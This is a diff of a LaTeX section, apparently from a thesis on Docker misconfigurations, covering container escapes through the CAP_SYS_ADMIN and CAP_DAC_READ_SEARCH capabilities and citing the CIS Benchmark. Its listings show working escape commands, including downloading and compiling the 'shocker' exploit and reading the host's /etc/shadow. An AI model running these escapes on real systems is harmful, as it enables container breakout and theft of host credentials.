@@ -1,12 +1,12 @@
 \subsection{Capabilities}\label{misconfigurations:subsection:capabilities}
-As we saw in \autoref{protection-mechanisms:subsection:capabilities} to use privileged functionality in the Linux kernel, a process needs the relevant \lstinline{capability}. Docker containers are started with minimal capabilities, but it is possible to add extra capabilities on runtime. Giving containers extra capabilities, gives the container permission to perform certain actions. Some of these actions allow Docker escapes. We will look at two such capabilities.
+As we saw in \autoref{protection-mechanisms:subsection:capabilities}, to perform privileged actions in the Linux kernel, a process needs the relevant \lstinline{capability}. Docker containers are started with minimal capabilities, but it is possible to add extra capabilities on runtime. Giving containers extra capabilities, gives the container permission to perform certain actions. Some of these actions allow Docker escapes. We will look at two such capabilities.
 
 \hfill
 
 The CIS Benchmark covers all of these problems in one guideline: 5.3 (Ensure that Linux kernel capabilities are restricted within containers).
 
 \subsubsection{\texorpdfstring{\lstinline{CAP_SYS_ADMIN}}{CAP SYS ADMIN}}
-The Docker escape by Felix Wilhelm\cite{Felix-Wilhem-Tweet} needs to be run in privileged mode to work, but it can be rewritten to only need the permission to run \lstinline{mount}\cite{TrailOfBits-Docker-Escape}, which is granted by the \lstinline{CAP_SYS_ADMIN} capability.
+The Docker escape by Felix Wilhelm\cite{Felix-Wilhem-Tweet} we used in \autoref{subsection:privileged} needs to be run in privileged mode to work, but it can be rewritten to only need the permission to run \lstinline{mount}\cite{TrailOfBits-Docker-Escape}, which is granted by the \lstinline{CAP_SYS_ADMIN} capability.
 
 \begin{lstlisting}[caption={Docker escape using \lstinline{CAP_SYS_ADMIN}.},captionpos=b]
 (host)$ docker run --rm -it --cap-add=CAP_SYS_ADMIN --security-opt apparmor=unconfined ubuntu /bin/bash
@@ -23,16 +23,15 @@ The Docker escape by Felix Wilhelm\cite{Felix-Wilhem-Tweet} needs to be run in p
 (cont)# cat /output
 \end{lstlisting}
 
-Unlike before, instead of relying on \lstinline{--privilege} to give us write access to a \lstinline{cgroup}, we just need to mount our own. This gives us exactly the same scenario as before. We use a \lstinline{release_agent} to run code on the host. The only difference being that we have to do some manual work ourselves.
+Unlike before, instead of relying on \lstinline{--privileged} to give us write access to a \lstinline{cgroup}, we just need to mount our own. This gives us exactly the same scenario as before. We use a \lstinline{release_agent} to run code on the host. The only difference being that we have to do some manual work ourselves.
 
 \subsubsection{\texorpdfstring{\lstinline{CAP_DAC_READ_SEARCH}}{CAP DAC READ SEARCH}}
-Before Docker 1.0.0 \lstinline{CAP_DAC_READ_SEARCH} was added to the default capabilities that a containers are given. But this capability allows a process to escape its the container\cite{Docker-Shocker-Seclists}. A process with \lstinline{CAP_DAC_READ_SEARCH} is able to bruteforce the index of files outside of the container. To demonstrate this attack a proof of concept exploit was released\cite{Docker-Shocker}\cite{Docker-Shocker-Analysis}. This exploit has been released in 2014, but still works on containers with the \lstinline{CAP_DAC_READ_SEARCH} capability.
+Before Docker 1.0.0 \lstinline{CAP_DAC_READ_SEARCH} was added to the default capabilities that a containers are given. But this capability allows a process to escape its the container\cite{Docker-Shocker-Seclists}. A process with \lstinline{CAP_DAC_READ_SEARCH} is able to bruteforce the internal index of files outside of the container. To demonstrate this attack a proof of concept exploit was released\cite{Docker-Shocker}\cite{Docker-Shocker-Analysis}. This exploit has been released in 2014, but still works on containers with the \lstinline{CAP_DAC_READ_SEARCH} capability.
 
 \hfill
 
 \begin{lstlisting}[caption={Docker escape using \lstinline{CAP_DAC_READ_SEARCH}.},captionpos=b]
-(host)$ cd /tmp
-(host)$ curl -O http://stealth.openwall.net/xSports/shocker.c
+(host)$ curl -o /tmp/shocker.c http://stealth.openwall.net/xSports/shocker.c
 (host)$ sed -i "s/\/.dockerinit/\/tmp\/a.out/" shocker.c
 (host)$ cc -Wall -std=c99 -O2 shocker.c -static
 (host)$ docker run --rm -it --cap-add=CAP_DAC_READ_SEARCH -v /tmp:/tmp busybox sh
@@ -43,4 +42,4 @@ Before Docker 1.0.0 \lstinline{CAP_DAC_READ_SEARCH} was added to the default cap
 admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
 \end{lstlisting}
 
-The exploit needs a file with a file handle on the host system to properly work. Instead of the default \lstinline{/.dockerinit} (which is no longer created in newer versions of Docker) we use the exploit file itself \lstinline{/tmp/a.out}. We start a container with the \lstinline{CAP_DAC_READ_SEARCH} capability and run the exploit. It prints the password file of the host (\lstinline{/etc/shadow}).
+The exploit needs a file with a file handle on the host system to properly work. Instead of the default \lstinline{/.dockerinit} (which is no longer created in newer versions of Docker) we use the exploit file itself \lstinline{/tmp/a.out}. We start a container with the \lstinline{CAP_DAC_READ_SEARCH} capability and run the exploit. It prints the password file of the host (i.e. \lstinline{/etc/shadow}).
